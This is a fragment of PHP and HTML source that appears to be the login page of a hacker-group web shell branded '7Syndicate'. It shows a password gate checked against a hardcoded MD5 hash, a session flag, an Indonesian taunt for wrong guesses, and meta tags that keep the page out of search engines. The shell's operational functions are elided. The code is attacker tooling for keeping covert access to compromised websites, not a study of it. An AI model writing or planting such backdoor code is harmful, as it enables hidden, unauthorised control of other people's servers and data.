...
session_start();
$passwd = "e2dd25c5e4917bcc9f4e250fe22d0ffa";
if ($_POST['pass']) {
  $input_password = md5($_POST['passwd']);
  if ($input_password === $passwd) {
    $_SESSION['masuk'] = "masuk";
    header("Location: ?");
    exit;
  } else {
    echo "salah bg, mau ngapain ente?";
  }
}
...
?>
<title>Login 7Syndicate</title>
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<meta name="bingbot" content="noindex, nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" type="image/png" href="https://cdn1.iconfinder.com/data/icons/social-black-buttons/512/anonymous-512.png">
<style>
  html {
    background: black;
    color: deeppink;
...
<center>
<img src="https://cdn1.iconfinder.com/data/icons/social-black-buttons/512/anonymous-512.png" width="200" height="200">
<p>
<table height="100%" width="100%">
  <td align="center">
    ...
    <form enctype="multipart/form-data" method="post">
      ...
      <input type="submit" name="pass" value="tojos">
    </form>
  </td>
</table>
<?php
